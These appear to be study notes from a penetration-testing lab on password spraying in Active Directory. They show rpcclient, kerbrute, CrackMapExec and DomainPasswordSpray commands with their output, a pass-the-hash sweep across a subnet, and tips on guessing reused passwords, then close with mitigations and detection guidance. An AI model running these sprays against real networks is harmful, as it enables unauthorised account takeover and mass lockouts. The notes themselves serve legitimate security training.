# Internal Password Spraying

## Linux

### Internal Password Spraying

Once you've created a wordlist, it's time to execute the attack. Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. You can filter out invalid login attempts by grepping for "Authority" in the response. The following Bash one-liner can be used to perform this attack.

```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Trying this out against the target environment:

```bash
d41y@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

You can also use Kerbrute for the same attack:

```bash
d41y@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

There are multiple other methods for performing password spraying from Linux. Another great option is using CrackMapExec. This tool accepts a text file of usernames to be run against a single password in a spraying attack. Here you grep for ```+``` to filter out logon failures and hone in on only valid login attempts to ensure you don't miss anything by scrolling through many lines of output.

```bash
d41y@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

After getting one or more hits with your password spraying attack, you can then use CrackMapExec to validate the credentials quickly against a DC.

```bash
d41y@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

### Local Administrator Password Reuse

Internal password spraying is not only possible with domain user accounts. If you obtain administrative access and the NTLM password hash or cleartext password for the local administrator account, this can be attempted across multiple hosts in the network. Local administrator account password reuse is widespread due to the use of gold images in automated deployments and the perceived ease of management by enforcing the same password across multiple hosts.

CrackMapExec is a handy tool for attempting this attack. It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.

When working with local administrator accounts, one consideration is password-reuse or common password formats across accounts. If you find a desktop host with the local administrator account password set to something unique such as ```$desktop%@admin123```, it might be worth attempting ```$server%@admin123``` against servers. Also, if you find non-standard local administrator accounts such as ```bsmith```, you may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If you retrieve the password for a user named ```ajones```, it is worth trying the same password on their admin account, for example, ```ajones_adm```, to see if they are reusing their passwords. This is also common in domain trust situations. You may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.

Sometimes you may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, you can spray the NT hash across an entire subnet to hunt for local administrator accounts with the same password set. In the example below, you attempt to authenticate to all hosts in a /23 network using the built-in local administrator account NT hash retrieved from another machine. The ```--local-auth``` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so you don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.

```bash
d41y@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

The output above shows that the credentials were valid as a local admin on 3 systems in the 172.16.5.0/23 subnet. You could then move to enumerate each system to see if you can find anything that will help further your access.

This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during pentests, even if it is not part of your path to compromise the domain, as it is a common issue and should be highlighted for your clients. One way to remediate this issue is using the free Mircosoft tool LAPS to have AD manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.

## Windows

### Internal Password Spraying

From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If you are authenticated to the domain, the tool will automatically generate a user list from AD, query the domain password policy, and exclude user accounts within one attempt of locking out. Like how you ran the spraying attack from your Linux host, you can also supply a user list to the tool if you are on a Windows host but not authenticated to the domain. You may run into a situation where the client wants you to perform testing from a managed Windows device in their network that you can load tools onto. You may be physically on-site in their offices and wish to test from a Windows VM, or you may gain an initial foothold through some other attack, authenticate to a host in the domain and perform password spraying in an attempt to obtain credentials for an account that has more rights in the domain.

The are several options available to you with the tool. Since the host is domain-joined, you will skip the ```-UserList``` flag and let the tool generate a list for you. You'll supply the ```Password``` flag and one single password and then use the ```-OutFile``` flag to write your output to a file for later use.

```bash
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

[*] Current domain is compatible with Fine-Grained Password Policy.
[*] Now creating a list of users to spray...
[*] The smallest lockout threshold discovered in the domain is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Created a userlist containing 2923 users gathered from the current user's domain
[*] The domain password policy observation window is set to  minutes.
[*] Setting a  minute wait in between sprays.

Confirm Password Spray
Are you sure you want to perform a password spray against 2923 accounts?
[Y] Yes  [N] No  [?] Help (default is "Y"): Y

[*] Password spraying has begun with  1  passwords
[*] This might take a while depending on the total number of users
[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM
[*] Writing successes to spray_success
[*] SUCCESS! User:sgage Password:Welcome1
[*] SUCCESS! User:tjohnson Password:Welcome1

[*] Password spraying is complete
[*] Any passwords that were successfully sprayed have been output to spray_success
```

You could also utilize Kerbrute to perform the same user enumeration and spraying.

### Mitigations

Several steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.

- MFA
- Restricting Access
- Reducing Impact of Successful Exploitation
- Password Hygiene

### Other Considerations

It is vital to ensure that your domain password lockout policy doesn't increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period of time.

### Detection

Some indicators of external password spraying attacks include many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.

In the DC's security log, many instances of event ID 4625: "An account failed to log on" over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID 4771: "Kerberos pre-authentication failed", which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. Read [this](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing).

With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.